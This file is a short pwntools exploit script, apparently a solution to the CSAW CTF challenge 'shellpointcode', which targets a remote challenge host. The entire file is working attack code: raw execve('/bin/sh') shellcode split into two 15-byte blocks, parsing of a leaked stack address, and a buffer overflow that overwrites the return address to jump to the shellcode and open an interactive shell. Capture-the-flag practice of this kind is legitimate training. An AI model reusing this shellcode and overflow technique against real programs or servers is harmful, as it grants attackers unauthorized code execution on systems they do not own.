from __future__ import print_function
# Import pwntools
from pwn import *

# Establish the target process
#target = process('./shellpointcode')
target = remote('pwn.chal.csaw.io', 9005)
#gdb.attach(target)


# Establish the two 15 byte shellcode blocks
s0 = "\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\xe9\x11\x00\x00\x00"
s1 = "\x90\x31\xf6\xf7\xe6\x04\x3b\x48\xf7\xdf\x57\x54\x5f\x0f\x05"


# Send the second block first, since it will be stored in memory where it will be executed second
print(target.recvline('node 1:\n'))
target.sendline(s1)

# Send the first block of shell code
print(target.recvline('node 2:\n'))
target.sendline(s0)

# Grab and filter out the infoleak
print(target.recvuntil('node.next:'))
leak = target.recvline()
leak = leak.replace('\x0a', '')
print('leak: ' + leak)
leak = int(leak, 16)
log.info("Leak is: " + hex(leak))

# Send the buffer overflow to overwrite the return address to our shellcode, and get code exec
target.sendline('0'*11 + p64(leak + 0x8))

# Drop to an interactive shell
target.interactive('node.next: ')